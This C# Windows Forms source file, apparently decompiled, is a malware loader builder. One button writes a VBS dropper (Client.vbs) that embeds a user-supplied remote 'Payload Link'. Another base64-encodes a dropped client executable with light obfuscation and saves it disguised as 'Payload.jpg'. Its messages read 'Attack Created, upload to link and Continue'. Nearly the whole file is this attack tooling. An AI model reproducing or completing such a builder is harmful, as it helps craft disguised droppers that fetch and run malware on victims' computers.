using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Windows.Forms;
using loader.Properties;

namespace loader
{

	public partial class Form1 : Form
	{

		public Form1()
		{
			this.InitializeComponent();
		}


		private void panel1_DragEnter(object sender, DragEventArgs e)
		{
			e.Effect = DragDropEffects.All;
		}


		private void panel1_DragDrop(object sender, DragEventArgs e)
		{
			this.file = (string[])e.Data.GetData(DataFormats.FileDrop, false);
		}


		private void button1_Click(object sender, EventArgs e)
		{
			bool flag = this.textBox1.Text.Length == 0;
			if (flag)
			{
				MessageBox.Show(this, "Enter Payload Link !", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				using (StreamWriter streamWriter = new StreamWriter("Client.vbs", true))
				{
					streamWriter.WriteLine(Resources.stub_N.Replace("LINK", this.textBox1.Text));
				}
				MessageBox.Show("VBS Created..!");
			}
		}


		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		private void label1_Click(object sender, EventArgs e)
		{
		}

		private void Form1_Load(object sender, EventArgs e)
		{
		}

		private void button2_Click(object sender, EventArgs e)
		{
			int length = this.file[0].Length;
			bool flag = length == 0;
			if (flag)
			{
				MessageBox.Show(this, "Make sure you dropped your Client ", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				byte[] inArray = File.ReadAllBytes(this.file[0]);
				string text = Form1.Randomchar(2);
				string newValue = Convert.ToBase64String(inArray).Remove(0, 2);
				string text2 = Console.ReadLine();
				string value = Resources.RunP.Replace("CLIENT", newValue);
				using (StreamWriter streamWriter = new StreamWriter("Payload.jpg"))
				{
					streamWriter.WriteLine(value);
				}
				MessageBox.Show("Attack Created, upload to link and Continue");
			}
		}

		public static string Randomchar(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("!@#%^&*()><.|", length)
			select s[Form1.random.Next(s.Length)]).ToArray<char>());
		}

		public static string ReverseString(string s)
		{
			char[] array = s.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		private static byte[] Compress(byte[] data)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(data, 0, data.Length);
					gzipStream.Close();
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
			select s[Form1.random.Next(s.Length)]).ToArray<char>());
		}

		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}



		private void panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		private void label3_Click(object sender, EventArgs e)
		{
		}

		private void textBox2_TextChanged(object sender, EventArgs e)
		{
		}

		private void label4_Click(object sender, EventArgs e)
		{
		}

		private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void label5_Click(object sender, EventArgs e)
		{
		}

		private void label2_Click(object sender, EventArgs e)
		{
		}

		public string[] file = new string[]
		{
			""
		};

		public string LINK;

		private static Random random = new Random();

        private void Loader_Click(object sender, EventArgs e)
        {

        }
    }
}
